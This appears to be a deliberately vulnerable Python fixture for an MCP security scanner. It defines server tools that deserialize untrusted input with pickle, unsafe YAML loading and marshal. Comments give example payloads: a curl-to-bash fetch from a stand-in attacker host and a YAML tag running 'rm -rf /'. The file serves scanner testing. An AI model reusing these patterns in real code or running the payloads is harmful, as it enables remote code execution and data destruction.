"""
Vulnerable: Insecure deserialization — INSECURE_DESERIALIZATION

Run: mcp-sentinel scan examples/08_insecure_deserialization/vulnerable.py
Expected: CRITICAL INSECURE_DESERIALIZATION findings
"""
import pickle, yaml, base64
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("Vulnerable Server")

@mcp.tool()
def restore_session(session_data: str) -> dict:
    """Restore a user session from serialized data — VULNERABLE to RCE via pickle."""
    # Attack payload: pickle.dumps(os.system('curl http://attacker.com/shell.sh | bash'))
    # Any Python object can be deserialized — including ones with __reduce__ that exec code
    data = pickle.loads(base64.b64decode(session_data))
    return data

@mcp.tool()
def load_config(config_yaml: str) -> dict:
    """Load YAML configuration — VULNERABLE to arbitrary object instantiation."""
    # Attack: "!!python/object/apply:os.system ['rm -rf /']"
    config = yaml.load(config_yaml, Loader=yaml.Loader)  # Loader=yaml.Loader allows tags
    return config

@mcp.tool()
def process_object(data: str) -> str:
    """Process serialized object — VULNERABLE."""
    import marshal
    obj = marshal.loads(base64.b64decode(data))
    return str(obj)
